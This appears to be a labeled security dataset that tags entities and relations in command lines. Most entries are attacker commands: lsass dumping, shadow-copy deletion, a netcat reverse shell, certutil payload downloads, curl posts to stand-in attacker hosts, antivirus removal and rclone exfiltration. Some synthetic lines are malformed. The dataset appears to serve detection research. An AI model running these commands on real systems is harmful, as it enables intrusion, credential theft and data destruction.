+process-file-unlink(e1,e2)	<e1>powershell.exe</e1> -Command PowerShell -Command Get-CimInstance <e2>Win32_ShadowCopy</e2> | Remove-CimInstance
+process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netsh</e2> advfirewall firewall add rule dir=out name =""WMI_OUT"" program=C:\Windows\system32\svchost.exe service=winmgmt action=allow protocol=TCP localport=any > C:\Windows\Temp\WkiMfXXo.tmp 2>&1"
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>taskkill</e2> /IM winlogon.exe /F
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -sc trustdmp > trustdmp.txt
+process-file-write(e1,e2)	cmd_7.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_7.bat</e2>
+process-file-read(e1,e2)	"start <e1>PsExec.exe</e1> -accepteula <e2>@C:\share$\comps1.txt</e2> -u ""domain\User"" -p ""$PASSWORD"" cmd /c COPY ""\\DOMAINCONTROLLER\share$\fQumH.exe"" ""C:\windows\temp"""
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>attrib</e2> +s +h C:\Users\Public\runme.bat
+process-file-read(e1,e2)	<e1>reg_40.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
+process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c dir 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
+process-process-fork(e1,e2)	wmic.exe <e1>powershell</e1> Start-Process <e2>python.exe</e2>
+process-process-fork(e1,e2)	"<e1>wmic</e1> /node:IP_Address process call create <e2>""cmd.exe</e2> /c start C:\Progradata\sc_https_x64.exe"""
+Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\hosts.txt)</e1> do ping -n 1 %i -v 4 | <e2>find</e2> /I TTL >> C:\ProgramData\hosts_live.txt
+process-socket-send(e1,e2)	svchost.exe <e1>curl</e1> -X POST --data 'ping' <e2>https://evil.server/payload</e2>
+process-file-unlink(e1,e2)	cmd.exe /c <e1>DEL</e1> <e2>%USERPROFILE%\AppData\bigfile.txt</e2>
+process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp""</e2> /t REG_DWORD /v ""fEnableWinStation"" /d 1 /f"
+process-file-read(e1,e2)	<e1>ftp_90.exe</e1> <e2>-s:script_90.txt</e2> C:\inetpub\wwwroot\ftp_90.log
+process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Malwarebytes' Managed Client""</e2> call uninstall /nointeractive"
+process-process-fork(e1,e2)	"<e1>torify</e1> <e2>ghauri</e2> -u ""https://<domain>.<domain>.in/products/all-products?category=CATMAPF0CE"" --dbs"
+process-socket-send(e1,e2)	rundll32.exe <e1>curl</e1> -X POST --data 'ping' <e2>192.168.1.100:8080</e2>
+process-process-fork(e1,e2)	"cmd.exe /C <e1>wmic</e1> /node:""servername.domainname"" process call create <e2>""C:\PerfLogs\procdump.exe</e2> -accepteula -ma lsass C:\PerfLogs\lsass.dmp"""
+process-socket-send(e1,e2)	"<e1>wmic</e1> <e2>/node:""[TARGET IP]""</e2> /user:""[DOMAIN]\[USER]"" /password:""[PASSWORD]"" process call create ""cmd.exe /c c:\windows\temp\p.bat"""
+process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd <e2>%appdata%\Microsoft\Network</e2> && python.exe Packages.txt
+process-file-exec(e1,e2)	"wmic /node:""<IP ADDRESS>"" /user:""<DOMAIN>\Administrator"" /password:""<PASSWORD>"" process call create <e1>""cmd.exe</e1> /c <e2>c:\windows\temp\ttsel.exe""</e2>"
+process-file-exec(e1,e2)	<e1>wmic.exe</e1> -exec <e2>C:\Windows\Temp\evil.dll</e2>
+process-file-write(e1,e2)	<e1>ftp_67.exe</e1> -s:script_67.txt <e2>C:\inetpub\wwwroot\ftp_67.log</e2>
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>taskkill</e2> /IM taskmgr.exe /F
+process-file-chmod(e1,e2)	"<e1>icacls</e1> <e2>""D:\*""</e2> /grant Everyone\:F /T /C /Q"
+process-file-write(e1,e2)	"psexec \\<redacted> -u <redacted>\<redacted> -p <redacted> <e1>reg</e1> add <e2>""hklm\system\currentcontrolset\control\lsa""</e2> /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"
+Other	"start PsExec.exe -accepteula -d <e1>@C:\share$\comps5.txt</e1> -u ""domain\User"" -p ""$PASSWORD"" cmd /c <e2>""C:\windows\temp\fQumH.exe""</e2>"
+process-file-write(e1,e2)	<e1>adfind.exe</e1> -sc trustdmp > <e2>trustdmp.txt</e2>
+process-file-read(e1,e2)	"<e1>powershell_52.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_52.yaml""</e2>"
+process-process-fork(e1,e2)	"<e1>schtasks</e1> /Create /TN ""8766714F94DD"" /XML <e2>""C:\ProgramData\Microsoft\51D7701F6EB775C7.txt""</e2>"
+process-process-fork(e1,e2)	<e1>nc</e1> -e <e2>/bin/bash</e2> 104.200.67.3 1608 2> /dev/null
+process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m http.server 8080 --bind <e2>10.10.10.10:4444</e2>
+process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Webroot SecureAnywhere"" call uninstall /nointeractive"
+Other	"<e1>C:\Windows\system32\cmd.exe</e1> /C AdFind.exe -f ""&(objectcategory=computer)"" operatingSystem -csv > <e2>1.csv</e2>"
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>getsystem</e2>
+process-socket-send(e1,e2)	<e1>rundll32.exe</e1> locker.dll,run <e2>/TARGET=\\HOST1.DOMAIN.NAME\C$</e2> /TARGET=\\HOST2.DOMAIN.NAME\C$ /TARGET=\\HOST3.DOMAIN.NAME\C$ /login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall
+process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 192.168.1.100:8080
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> /c start <e2>powershell.exe</e2>
+process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m http.server 8080 --bind <e2>https://evil.server/payload</e2>
+process-socket-receive(e1,e2)	cmd.exe <e1>python3</e1> -m http.server 8080 --bind <e2>http://attacker.com/c2</e2>
+process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>echo</e1> 00e4f7418cd > <e2>\\.\pipe\9090e9</e2>
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>icacls</e2> C:\Windows\Temp\evil.dll /grant Everyone:F
+process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -f ""(objectcategory=person)"" > <e2>ad_users.txt</e2>"
+process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c C:\Users\USER~1\AppData\Local\Temp\J10B9.cmd > C:\Users\USER~1\AppData\Local\Temp\yp710BA.tmp 2> <e2>C:\Users\USER~1\AppData\Local\Temp\1N10CB.tmp</e2>
+process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers.txt) do ping -n 1 %i -v 4 | <e1>find</e1> /I TTL >> <e2>C:\ProgramData\servers_live.txt</e2>
+process-file-write(e1,e2)	"<e1>python_42.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_42.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
+process-process-fork(e1,e2)	<e1>cmd_5.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_5.bat
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && <e2>python.exe</e2> Packages.txt
+process-file-unlink(e1,e2)	rundll32.exe <e1>rm</e1> <e2>C:\Users\Public\runme.bat</e2>
+process-file-exec(e1,e2)	"<e1>wmic</e1> /node:""192.168.1.2"" process call create <e2>""C:\Perflogs\434.bat""</e2>"
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>taskkill</e2> /IM explorer.exe /F
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>wevtutil</e2> cl application4
+process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>/var/tmp/hide.so</e2>
+process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netstat</e2> -a -n -p tcp | find ""ESTAB"""
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork https://evil.server/payload
+process-file-write(e1,e2)	"cmd /v /c <e1>nltest</e1> /trusted\_domains > <e2>""%TEMP%\22041.txt""</e2> 2>&1"
+process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind https://evil.server/payload
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>icacls</e2> C:\Windows\Temp\evil.dll /grant Everyone:F
+process-file-unlink(e1,e2)	cmd.exe /c <e1>DEL</e1> <e2>%USERPROFILE%\AppData\1.bat</e2>
+process-process-unlink(e1,e2)	<e1>svchost.exe</e1> Stop-Process -Name <e2>winlogon.exe</e2> -Force
+process-socket-send(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> <e2>/node:""ENDPOINT""</e2> process call create C:\test.exe"
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>del</e2> /tmp/malware.sh
+process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>c:\windows\adfs\py\UpdateEdge.bat</e2> /sc MINUTE /mo 720 /F"
+process-process-unlink(e1,e2)	<e1>wmic.exe</e1> kill $(Get-Process <e2>lsass.exe.Id)</e2>
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> HOSTX
+Other	C:\Windows\system32\cmd.exe /c cd <e1>%appdata%\Microsoft\Network</e1> && powershell -Command start <e2>script.bat</e2> -Verb RunAs
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> /c start <e2>wmic.exe</e2>
+process-socket-send(e1,e2)	cmd.exe /c <e1>echo</e1> J9kzQ2Y0qO | <e2>C:\ProgramData\anydesk.exe</e2> --set-password
+process-process-unlink(e1,e2)	<e1>cmd.exe</e1> kill $(Get-Process <e2>winlogon.exe.Id)</e2>
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>attrib</e2> +s +h /tmp/malware.sh
+process-socket-send(e1,e2)	cmd.exe /c <e1>echo</e1> a3fed5b3a32 > <e2>\\.\pipe\3406c2</e2>
+process-file-exec(e1,e2)	powershell <e1>rundll32.exe</e1> <e2>c:\windows\system32\comsvcs.dll</e2>, minidump (get-process lsass).id c:\temp\lsass.dmp full
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>curl</e2> -X POST --data 'ping' 192.168.1.100:8080
+process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netsh</e2> advfirewall firewall add rule dir=in name=""DCOM"" program=C:\Windows\system32\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\Windows\Temp\pOrnerOW.tmp 2>&1"
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>echo</e2> 31b925aa0f7 > \\.\pipe\8945a5
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>icacls</e2> /usr/local/bin/backdoor /grant Everyone:F
+process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>BackupExecManagementService</e2> /y
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>nc</e2> -lvp 4444 -s 10.10.10.10:4444
+process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>explorer.exe</e2> /F
+process-process-fork(e1,e2)	"<e1>schtasks</e1> /create /RL HIGHEST /RU ""NT AUTHORITY\SYSTEM"" /sc minute /mo 30 /tn ""schdsWin"" /tr <e2>""cmd.exe</e2> /C certutil.exe -urlcache -f http://192.169.6.122:6770/svchost.exe %systemdrive%\\Windows\\Temp\\svchost.exe & %systemdrive%\\Windows\\Temp\\svchost.exe"""
+process-process-inject(e1,e2)	<e1>wmic.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>lsass.exe</e2>
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>Set-MpPreference</e2> -DisableRealtimeMonitoring \$true
+process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m http.server 8080 --bind <e2>https://evil.server/payload</e2>
+process-file-write(e1,e2)	"<e1>powershell_20.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_20.txt</e2> -Value 'infected'"""
+process-file-read(e1,e2)	<e1>powershell_70.exe</e1> Get-Content <e2>C:\Users\Public\secrets_70.txt</e2>
+process-file-chmod(e1,e2)	wmic.exe <e1>attrib</e1> +s +h <e2>C:\Users\Public\runme.bat</e2>
+process-file-unlink(e1,e2)	powershell.exe <e1>rm</e1> <e2>C:\Windows\Temp\evil.dll</e2>
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 10.10.10.10:4444
+process-file-exec(e1,e2)	<e1>rundll32_83.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
+process-process-inject(e1,e2)	<e1>cmd.exe</e1> dllinjector.exe -p <e2>explorer.exe</e2> -d payload.dll
+process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>reg</e2> add ""HKLM\software\microsoft\windows nt\currentversion\winlogon"" /v UserInit /t reg_sz /d ""c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat"
+process-file-unlink(e1,e2)	svchost.exe <e1>Remove-Item</e1> <e2>C:\Windows\Temp\evil.dll</e2> -Force
+Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\servers.txt)</e1> do <e2>ping</e2> -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\servers_live.txt
+process-socket-send(e1,e2)	<e1>cmd.exe</e1> Invoke-WebRequest -Uri <e2>10.10.10.10:4444</e2> -Method POST
+process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System""</e2> /v LocalAccountTokenFilterPolicy /t REG\_DWORD /d 1 /f"
+process-socket-receive(e1,e2)	powershell.exe <e1>nc</e1> -lvp <e2>4444</e2> -s 10.10.10.10:4444
+process-file-read(e1,e2)	<e1>wmic_97.exe</e1> process get commandline < <e2>C:\cmd\proc_97.txt</e2>
+process-file-write(e1,e2)	<e1>schtasks.exe</e1> /Create /F /XML C:\windows\temp\Wininet.xml /tn <e2>'\Microsoft\Windows\Maintenance\Wininet'</e2>
+process-socket-receive(e1,e2)	rundll32.exe <e1>nc</e1> -lvp 4444 -s <e2>192.168.1.100:8080</e2>
+process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m http.server 8080 --bind <e2>https://evil.server/payload</e2>
+process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run""</e2> /V ""microsoft update"" /t REG_SZ /F /D ""SCHTASKS /run /tn 9T6ukfi6"""
+process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.catalogdataservice.exe</e2> /F
+Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\hosts.txt)</e1> do <e2>ping</e2> -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\hosts_live.txt
+process-process-inject(e1,e2)	<e1>svchost.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>svchost.exe</e2>
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> runas /user:admin <e2>cmd.exe</e2>
+process-process-fork(e1,e2)	"<e1>C:\Windows\System32\cmd.exe</e1> /c echo <e2>curl</e2> https://moashraya[.]com/out/t.php --output ""%temp%\magni.waut.a"" --ssl no-revoke --insecure --location > %temp%\magni.w.bat"
+process-file-read(e1,e2)	<e1>wmic_48.exe</e1> process get commandline < <e2>C:\cmd\proc_48.txt</e2>
+process-file-write(e1,e2)	<e1>rundll32_46.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
+process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>taskmgr.exe</e2>
+process-process-fork(e1,e2)	<e1>C:\Windows\System32\cmd.exe</e1> /c <e2>rundll32.exe</e2> C:\ProgramData\x86.dll, StartA
+process-file-chmod(e1,e2)	rundll32.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
+process-file-chmod(e1,e2)	wmic.exe <e1>icacl</e1>s <e2>/var/tmp/hide.so</e2> /grant Everyone:F
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> /c start <e2>python.exe</e2>
+process-socket-receive(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> <e2>/node:""REDACTED""</e2> process call create ""c:\windows\system32\rundll32.exe c:\windows\temp\1.dll, DllRegisterServer‘"
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> /c start <e2>rundll32.exe</e2>
+process-socket-send(e1,e2)	"cmd.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>10.10.10.10:4444</e2> -Body 'cmd=whoami'"""
+process-file-read(e1,e2)	<e1>notepad_56.exe</e1> <e2>C:\Users\admin\notes_56.txt</e2>
+Other	cmd.exe /q /c upload <e1>c:\users\<user>\documents\<doc></e1> <e2>/home/kali/desktop/<doc></e2> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in (C:\ProgramData\hosts.txt) do ping -n 1 %i -v 4 | <e2>find</e2> /I TTL >> C:\ProgramData\hosts_live.txt
+process-file-read(e1,e2)	"<e1>cmd.exe</e1> /c ""bitsadmin /transfer ds <e2>""\\REDACTED\share$\ds.exe""</e2> ""%APPDATA%\ds.exe"" && ""%APPDATA%\ds.exe"" -pass REDACTED"""
+process-file-read(e1,e2)	<e1>notepad_66.exe</e1> <e2>C:\Users\admin\notes_66.txt</e2>
+process-socket-send(e1,e2)	"<e1>netsh</e1> advfirewall firewall set rule <e2>group=""remote desktop""</e2> new enable=yes"
+process-process-unlink(e1,e2)	<e1>python.exe</e1> Stop-Process -Name <e2>svchost.exe</e2> -Force
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>curl</e2> -X POST --data 'ping' https://evil.server/payload
+process-file-read(e1,e2)	<e1>cmd_35.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>svchost.exe</e2>
+Other	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && powershell Expand-Archive <e2>python-3.10.4-embed-amd64.zip</e2> -DestinationPath %appdata%\Microsoft\Network
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>vssadmin</e2> create shadow /for=C: 2>&1
+process-process-inject(e1,e2)	<e1>cmd.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>notepad.exe</e2>
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -subnets -f (objectCategory=subnet)> subnets.txt
+process-file-unlink(e1,e2)	<e1>reg.exe</e1> delete <e2>hkcu\software\classes\ms-settings</e2> /f >nul 2>&1
+process-socket-send(e1,e2)	"wmic.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>10.10.10.10:4444</e2> -Body 'cmd=whoami'"""
+process-process-fork(e1,e2)	<e1>net</e1> user <e2>sqlbackup</e2> qc69t4bz0ke3 /add
+process-file-write(e1,e2)	<e1>rundll32_99.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
+process-file-exec(e1,e2)	"WMIC /node:""DC.example.domain"" process call create <e1>""rundll32</e1> <e2>C:\PerfLogs\arti64.dll, StartW""</e2>"
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>python.exe</e2>
+process-file-exec(e1,e2)	<e1>C:\Windows\System32\rundll32.exe</e1> <e2>dar.dll,DllRegisterServer</e2>
+process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>/usr/local/bin/backdoor</e2>
+process-process-unlink(e1,e2)	<e1>powershell.exe</e1> kill $(Get-Process <e2>svchost.exe.Id)</e2>
+process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Microsoft Security Client""</e2> call uninstall /nointeractive"
+process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKCU\Software\Policies\Microsoft\Windows\Explorer""</e2> /v ""DisableNotificationCenter"" /t REG_DWORD /d 0x1 /f"
+process-socket-receive(e1,e2)	rundll32.exe <e1>nc</e1> -lvp 4444 -s <e2>https://evil.server/payload</e2>
+process-socket-receive(e1,e2)	svchost.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>http://attacker.com/c2</e2>
+Other	ping -n 1 <e1>hostname</e1> >> <e2>C:\programdata\log.txt</e2>
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>rm</e2> C:\Users\Public\runme.bat
+process-process-fork(e1,e2)	<e1>cmd_95.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_95.txt
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>chmod</e2> 777 /usr/local/bin/backdoor
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in (C:\ProgramData\hosts.txt) do <e2>ping</e2> -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\hosts_live.txt
+process-process-fork(e1,e2)	"<e1>C:\Windows\system32\schtasks.exe</e1> /run /tn <e2>""Zvhlxdonjwfvei""</e2>"
+process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind http://attacker.com/c2
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>Uninstall-WindowsFeature</e2> -Name Windows-Defender
+process-file-write(e1,e2)	"<e1>esentutl.exe</e1> /r V01 /l""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"" <e2>/s""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache""</e2> /d""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"""
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>taskkill</e2> /IM explorer.exe /F
+process-process-fork(e1,e2)	<e1>rclone</e1> copy <e2>[REDACTED]:/mnt/sdd/REDACTED</e2> --include-from include.txt
+process-process-inject(e1,e2)	<e1>python.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>taskmgr.exe</e2>
+process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>egui.exe</e2>
+process-process-fork(e1,e2)	<e1>C:\Windows\System32\cmd.exe</e1> /c <e2>rundll32.exe</e2>
+process-socket-receive(e1,e2)	python.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>10.10.10.10:4444</e2>
+process-process-unlink(e1,e2)	<e1>svchost.exe</e1> kill $(Get-Process <e2>lsass.exe.Id)</e2>
+process-file-read(e1,e2)	<e1>reg_83.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
+Other	C:\Windows\system32\cmd.exe /C for /f %%i in <e1>(C:\ProgramData\servers_live.txt)</e1> do dir <e2>\\%%i\C$</e2> >> C:\ProgramData\servers_live_dir.txt
+process-socket-receive(e1,e2)	python.exe <e1>nc</e1> -lvp 4444 -s <e2>192.168.1.100:8080</e2>
+process-file-exec(e1,e2)	<e1>wmic.exe</e1> /c start <e2>/usr/local/bin/backdoor</e2>
+process-file-write(e1,e2)	"<e1>cmd.exe</e1> /c ""bitsadmin /transfer ds ""\\REDACTED\share$\ds.exe"" <e2>""%APPDATA%\ds.exe""</e2> && ""%APPDATA%\ds.exe"" -pass REDACTED"""
+process-file-write(e1,e2)	cmd.exe /c <e1>certutil</e1> -decode %USERPROFILE%\AppData\bigfile.txt <e2>%USERPROFILE%\AppData\bigfile.exe</e2>
+process-process-unlink(e1,e2)	<e1>cmd.exe</e1> Stop-Process -Name <e2>notepad.exe</e2> -Force
+process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C netstat -a -n -p tcp | <e2>find</e2> ""ESTAB"""
+process-socket-receive(e1,e2)	wmic.exe <e1>nc</e1> -lvp 4444 -s <e2>http://attacker.com/c2</e2>
+process-file-exec(e1,e2)	"<e1>cmd.exe</e1> -Command ""Start-Process <e2>C:\Windows\Temp\evil.dll""</e2>"
+process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""SQLsafe Backup Service""</e2> /y"
+process-file-exec(e1,e2)	<e1>powershell.exe</e1> -exec <e2>/tmp/malware.sh</e2>
+process-socket-send(e1,e2)	cmd.exe /C <e1>wmic</e1> <e2>/node:<remote host></e2> process get executablepath
+process-file-read(e1,e2)	<e1>certutil_59.exe</e1> -urlcache -split -f http://malicious.site/data_59.enc <e2>C:\Temp\temp_59.enc</e2>
+process-file-write(e1,e2)	<e1>notepad_26.exe</e1> <e2>C:\Users\test\notes_26.txt</e2>
+process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Symantec Endpoint Protection"" call uninstall /nointeractive"
+process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C for /f %%i in (C:\ProgramData\servers_live.txt) do <e1>dir</e1> \\%%i\C$ >> <e2>C:\ProgramData\servers_live_dir.txt</e2>
+process-file-write(e1,e2)	"cmd.exe /C netsh advfirewall firewall add rule dir=in name=""DCOM"" <e1>program=C:\Windows\system32\svchost.exe</e1> service=rpcss action=allow protocol=TCP localport=135 > <e2>C:\Windows\Temp\pOrnerOW.tmp</e2> 2>&1"
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>rm</e2> C:\Users\Public\runme.bat
+process-file-write(e1,e2)	<e1>reg</e1> add <e2>HKLM\SYSTEM\CurrrentControlSet\Control\Terminal Server</e2> /f /v fDenyTSConnections /t REG_DWORD /d 0
+process-file-write(e1,e2)	<e1>adfind.exe</e1> -sc computers_pwdnotreqd > <e2>computers_pwdnotreqd.txt</e2>
+process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>/tmp/malware.sh</e2>
+process-file-exec(e1,e2)	"<e1>psexec.exe</e1> \\<IP ADDRESS> -u <DOMAIN>\Administrator -p ""<PASSWORD>"" -s -d -h -r mstdc -accepteula -nobanner <e2>c:\windows\temp\ttsel.exe</e2>"
+process-file-exec(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> /node:""DOMAINCONTROLLER"" process call create <e2>C:\3.exe</e2>"
+process-file-exec(e1,e2)	<e1>C:\Windows\system32\mmc.exe</e1> <e2>C:\Windows\system32\dsa.msc</e2>
+process-process-inject(e1,e2)	<e1>wmic.exe</e1> dllinjector.exe -p <e2>lsass.exe</e2> -d payload.dll
+process-file-read(e1,e2)	"<e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>%PUBLIC%\Music</e2>"
+process-socket-receive(e1,e2)	<e1>rclone.exe</e1> <e2>\\SERVER.domain.name\path</e2> mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
+process-file-write(e1,e2)	cmd_12.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_12.bat</e2>
+process-file-chmod(e1,e2)	<e1>attrib</e1> +h <e2>xmrig-notls.exe</e2>
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>attrib</e2> +s +h C:\Windows\Temp\evil.dll
+process-file-write(e1,e2)	"""powershell.exe"" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id <e1>C:\windows\temp\ssasl.pmd</e1> full | out-host; Compress-Archive C:\windows\temp\ssasl.pmd <e2>C:\windows\temp\ssasl.zip</e2>"
+process-process-fork(e1,e2)	"start <e1>PsExec.exe</e1> -accepteula @C:\share$\comps1.txt -u ""domain\User"" -p ""$PASSWORD"" <e2>cmd</e2> /c COPY ""\\DOMAINCONTROLLER\share$\fQumH.exe"" ""C:\windows\temp"""
+process-file-chmod(e1,e2)	powershell.exe <e1>chmod</e1> 777 <e2>/usr/local/bin/backdoor</e2>
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 10.10.10.10:4444
+process-process-fork(e1,e2)	rundll32.exe <e1>powershell</e1> Start-Process <e2>powershell.exe</e2>
+process-socket-send(e1,e2)	"<e1>wmic</e1> <e2>/node:<REDACTED></e2> /user:""<REDACTED>"" /password:""<REDACTED>"" logicaldisk get caption,description,drivetype,providername,volumename"
+process-socket-send(e1,e2)	"rundll32.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>10.10.10.10:4444</e2> -Body 'cmd=whoami'"""
+process-process-unlink(e1,e2)	<e1>python.exe</e1> Stop-Process -Name <e2>taskmgr.exe</e2> -Force
+process-file-read(e1,e2)	<e1>reg_65.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>curl</e2> -X POST --data 'ping' https://evil.server/payload
